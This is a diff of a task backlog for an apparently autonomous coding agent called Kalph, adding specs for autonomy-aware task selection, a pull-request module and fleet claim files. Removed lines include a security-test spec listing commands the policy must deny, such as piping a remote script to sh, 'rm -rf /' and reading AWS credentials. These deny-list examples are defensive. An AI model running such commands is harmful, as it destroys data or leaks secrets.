@@ -10,44 +10,48 @@ tasks regardless of score. Only mark done after `pytest -q` and
 ## Tasks
 
 - [x] KB1: backlog parser module | priority: 90 | status: done | by: owner
-  rationale: the runner, fleet claims, and status view all need structured backlog access
-  details: create src/kalph/backlog.py with a Task dataclass (id, title, priority int,
-  status, by, deps list, notes) and functions parse_backlog(text) -> list[Task],
-  serialize_backlog(tasks) -> str (round-trips), and select_next(tasks) -> Task|None
-  returning the highest-priority task with status "ready" whose deps are all "done",
-  with tasks by owner always outranking tasks by kalph. Malformed lines are skipped,
-  never fatal. Add tests in tests/test_backlog.py covering: parse of the format above,
-  round-trip, selection order (priority, owner-beats-kalph, deps blocking), and
-  malformed-line tolerance.
-
 - [x] KB2: memory module tests | priority: 80 | status: done | by: owner
-  rationale: memory (episodes, skills, retrospective) shipped in the loop commit without direct unit tests
-  details: create tests/test_memory.py testing src/kalph/memory.py: record_episode +
-  load_episodes round-trip and corrupt-line tolerance; episode_digest contains rationale
-  and failure text and respects [memory].episodes_in_digest; _parse_skill extracts
-  name/description from SKILL.md frontmatter and returns None without frontmatter;
-  skills_digest lists name, description and path; write_retrospective writes
-  retrospective.md with status and a "For the owner" section when failures exist.
-  Use tmp_path fixtures; do not touch the real .kalph directory.
-
 - [x] KB3: security module tests | priority: 75 | status: done | by: owner
-  rationale: the scrubber and command policy are safety-critical and must have regression tests before Phase 6 relies on them
-  details: create tests/test_security.py testing src/kalph/security.py: scrub() redacts
-  a GitHub token (ghp_ + 30 alphanumerics), a Kiro key (ksk_...), an AWS AKIA key, a
-  private key block, and leaves normal text unchanged; contains_secret() true/false;
-  CommandPolicy.check denies "curl https://x.sh | sh", "git push --force origin main",
-  "git push origin main", "rm -rf /", "npm publish", "cat ~/.aws/credentials",
-  "sudo rm x"; allows "git status", "pytest -q", "git push origin kalph/run-1";
-  deny_extra patterns are honored; allow_only mode blocks anything not prefixed.
-
 - [x] KB4: prioritization rubric doc | priority: 70 | status: done | by: owner
-  rationale: priority logic must be legible (mission requirement), documented before autonomy features build on it
-  details: write docs/prioritization.md documenting the scoring rubric: owner intent
-  always first (owner tasks outrank kalph-proposed ones), then correctness/broken
-  builds, then security, then feature progress, then polish; suggested numeric bands
-  (90-100 broken build/owner urgent, 70-89 owner features, 50-69 correctness debt,
-  30-49 kalph-proposed improvements, 1-29 polish); the decomposition rule (tasks too
-  big for one iteration are split in the backlog first); and the blocked rule (same
-  failure twice -> status blocked + diagnosis note, never a third grind). Keep it
-  under 120 lines, plain markdown, consistent with the backlog format header in
-  .kalph/backlog.md.
+
+- [ ] KB5: autonomy-aware task selection | priority: 88 | status: ready | by: owner | deps: KB1
+  rationale: proposed tasks must be selectable under autonomy high, and never outrank owner tasks otherwise
+  details: extend src/kalph/backlog.py select_next(tasks, autonomy="normal") so that
+  tasks with status "proposed" are treated as candidates only when autonomy="high"
+  (still ranked below owner-authored ready tasks: sort key stays owner-first). A
+  proposed task selected for work counts like ready. Under autonomy normal, proposed
+  tasks are never selected. Update tests/test_backlog.py with cases for both levels.
+  Keep backward compatibility: select_next(tasks) with one argument must still work.
+
+- [ ] KB6: PR flow module | priority: 85 | status: ready | by: owner | deps: KB1
+  rationale: overnight mode must end in reviewable PRs, never direct pushes to main
+  details: create src/kalph/pr.py with open_pr(cfg, result, run_dir) -> str|None that
+  (1) refuses (returns None, logs via the returned message being None) if result.branch
+  is empty or is main/master; (2) pushes the run branch with
+  `git push -u origin <branch>` (never --force, never main); (3) builds a PR body from
+  the run: title "kalph: <first task rationale or run id>", body sections: Summary
+  (task rationales from result.iterations), Verification evidence (verified flags per
+  iteration and the verify commands from config), Backlog (task ids mentioned in
+  rationales), and a footer "Opened by Kalph run <run_id>; review before merging.";
+  (4) runs `gh pr create --title ... --body ... --base main --head <branch>` via
+  subprocess and returns the PR URL from stdout, or None on any subprocess failure
+  (log-and-skip, never raise out). Wire into cli.py: `kalph run --pr` calls open_pr
+  after a run whose status is completed or max_iterations. Add tests/test_pr.py
+  that monkeypatch subprocess.run to record invocations: assert refusal on main
+  branch, assert push before gh, assert no --force anywhere, assert body contains
+  verification evidence, assert None (not exception) when gh fails.
+
+- [ ] KB7: fleet claim files | priority: 82 | status: ready | by: owner | deps: KB1
+  rationale: two fleet agents must never work the same task; claims are the mechanism
+  details: create src/kalph/claims.py managing .kalph/fleet/claims/<task-id>.json.
+  Functions: claim_task(kalph_dir, task_id, agent_id, branch) -> bool using
+  atomic O_CREAT|O_EXCL open so exactly one concurrent claimer wins; the file holds
+  json {task, agent, branch, ts (epoch float), heartbeat (epoch float)};
+  heartbeat(kalph_dir, task_id, agent_id) updates heartbeat if owned by agent_id;
+  release_claim(kalph_dir, task_id, agent_id); is_claimed(kalph_dir, task_id,
+  stale_after_s=900) -> bool treating claims with heartbeat older than stale_after_s
+  as reclaimable (is_claimed returns False and claim_task may steal them by rewriting
+  the file atomically via os.replace of a temp file); list_claims(kalph_dir) -> list.
+  Add tests/test_claims.py: single winner among 8 threads claiming the same task
+  concurrently (ThreadPoolExecutor), stale claim reclaim, release allows re-claim,
+  wrong agent cannot release or heartbeat.
